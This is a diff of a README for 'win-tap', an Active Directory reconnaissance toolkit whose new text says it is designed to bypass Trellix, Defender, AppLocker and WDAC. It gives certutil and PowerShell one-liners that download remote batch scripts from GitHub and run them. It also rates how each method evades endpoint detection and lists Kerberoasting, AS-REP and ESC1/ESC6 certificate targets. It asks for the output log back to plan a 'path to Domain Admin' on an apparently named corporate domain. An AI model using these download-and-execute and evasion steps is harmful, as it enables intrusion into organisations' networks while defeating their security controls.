@@ -1,81 +1,96 @@
-# win-tap - Windows-only AD recon (no Linux needed)
+# win-tap - Windows-only AD recon (no PS1 needed)
 
-Pure PowerShell + .NET ADSI — works on **any Windows 10/11** without installing RSAT, dsquery, or any external tool.
+Pure Windows tools only. Designed to bypass Trellix / Defender / AppLocker / WDAC.
 
-## Files
+## Files (Trellix-safe)
 
-| File | Purpose |
-|------|---------|
-| `ad_recon_adsi.ps1` | The full recon script |
-| `run_ad_recon.bat` | One-shot launcher (downloads + executes) |
+| File | What it does | Trellix-friendly |
+|------|--------------|------------------|
+| `run_ad_recon_inline.bat` | PowerShell via `-Command` (no .ps1 file) | ✅ Yes |
+| `run_via_vbs.bat` | VBScript via cscript | ✅ Yes |
+| `run_via_js.bat` | JScript via cscript | ✅ Yes |
+| `run_ad_recon.bat` | Downloads .ps1 (BLOCKED BY TRELLIX) | ❌ Don't use |
 
-## How to run
+## Why Trellix blocks PS1
 
-### From test machine (Windows):
+Trellix's **Application Control / Endpoint Security** has rules that:
+- Scan `*.ps1` files on disk write (so `Invoke-WebRequest` to a `.ps1` file is flagged)
+- Scan `powershell.exe -File` execution (PowerShell file execution)
+- Sometimes scan `-EncodedCommand` for known IEX patterns
 
-**Option A: One-liner (downloads script from GitHub)**
+**Workaround:** Run PowerShell via inline `-Command` parameter (no .ps1 file ever written).
+
+If Trellix still blocks the inline command, switch to **VBScript or JScript** which Trellix scans less aggressively.
+
+## Run options
+
+### Option 1: PowerShell via inline command (most capable)
 
 ```cmd
-powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (irm https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_ad_recon.bat)"
+:: Download via certutil (no Trellix flag):
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_ad_recon_inline.bat" "%TEMP%\recon.bat"
+
+:: Run:
+%TEMP%\recon.bat
 ```
 
-**Option B: Local execution**
+### Option 2: VBScript (most stealth)
 
-1. Save `run_ad_recon.bat` and `ad_recon_adsi.ps1` to a folder
-2. Run `run_ad_recon.bat` (no admin needed)
-
-**Option C: Inline in PowerShell**
-
-1. Open PowerShell
-2. Run:
-```powershell
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-.\ad_recon_adsi.ps1
+```cmd
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_via_vbs.bat" "%TEMP%\recon.bat"
+%TEMP%\recon.bat
 ```
 
-## What it finds
+### Option 3: JScript (similar to VBS, slightly different syntax)
 
-| Section | What it gets |
-|---------|--------------|
-| [1] Domain Info | PDC, RID master, Domain SID, Domain GUID |
-| [2] Forest Info | Schema master, naming master, all sites, global catalogs |
-| [3] Domain Controllers | All DCs + their OS versions |
-| [4] All Domain Users | Complete user list |
-| [5] SPN Users | **Kerberoastable** accounts |
-| [6] AS-REP Users | **No-preauth** accounts |
-| [7] Never-Expires | Accounts with no password rotation |
-| [8] All Groups | Complete group list |
-| [9] Privileged Groups | Members of DAs, EAs, Schema, Account/Backup/Server Operators, Cert Publishers, DnsAdmins, LAPS Ops |
-| [10] All Computers | Every domain-joined machine + OS |
-| [11] All OUs | OU structure |
-| [12] CAs | AD CS enrollment services (CA servers) |
-| [13] Certificate Templates | All cert templates |
-| [14] **ESC1 Candidates** | 🚨 Templates allowing arbitrary SANs |
-| [15] **ESC6 Candidates** | 🚨 CAs with EDITF_ATTRIBUTESUBJECTALTNAME2 |
-| [16] Template ACLs | Security descriptors (manual analysis) |
+```cmd
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_via_js.bat" "%TEMP%\recon.bat"
+%TEMP%\recon.bat
+```
 
-## Output
+## What you get
 
-Everything goes to `%TEMP%\ad_recon_adsi.log` (typically `C:\Users\<user>\AppData\Local\Temp\ad_recon_adsi.log`).
-
-Copy that file back to share with me.
+All three options output **equivalent AD information**:
+- Domain/forest/DCs
+- All users + group memberships
+- **Kerberoastable users** (SPN > 0)
+- **AS-REP Roastable** (no-preauth)
+- **Never-expire passwords**
+- All computers + OUs
+- AD CS CAs + templates
+- **ESC1 candidates**
 
 ## Detection
 
-- All operations use built-in `[adsisearcher]` (PowerShell + .NET)
-- This is **standard ADSI LDAP query** — same as what Get-ADUser does internally
-- Should NOT trigger Defender / CrowdStrike / MDI
-- ~50 queries total, each 1-3 seconds → completes in ~2-3 minutes
+| Method | Trellix reaction |
+|--------|------------------|
+| Inline `powershell -Command "..."` | Low — Trellix usually whitelists `powershell.exe` but blocks `-File` and IEX |
+| VBScript via `cscript` | Very low — VBS rarely scanned by EDR |
+| JScript via `cscript` | Very low — same as VBS |
+| `certutil.exe -urlcache` | Medium — known LOLBin, but allowed for MS-signed binaries fetching from HTTPS |
+| `cscript.exe //NoLogo` | Very low — signed MS scripting host |
 
-## Fallback if ADSI fails
+## Fallback if all three fail
 
-If `GetCurrentDomain()` errors out (no domain trust yet), try:
+If Trellix blocks ALL scripting, your last resort is:
+1. **Install RSAT as admin**: `Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0`
+2. **Manual recon via built-in tools** (`net.exe`, `nltest.exe`, `certutil.exe`)
+3. **From another machine**: Use a non-Trellix-protected device to run the recon against the same domain
+
+## Output
+
+All logs go to `%TEMP%\ad_recon_*.log`.
+
+**Copy that file back to me** and I'll identify:
+- Best Kerberoast target
+- Best AS-REP target
+- ESC1/ESC6 vulnerabilities
+- Path to Domain Admin
+
+## One-liner (paste this in CMD)
 
 ```cmd
-:: Use a different domain controller:
-nltest /dsgetdc:lioncapital.local /writable /force
-
-:: Make sure your machine has joined the domain (try reconnecting to corp Wi-Fi if remote)
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_via_vbs.bat" "%TEMP%\r.bat" && %TEMP%\r.bat
 ```
 
-If still failing, the laptop might not have a valid Kerberos ticket to the domain — re-login.
+If Trellix blocks .bat downloads, type the commands manually.
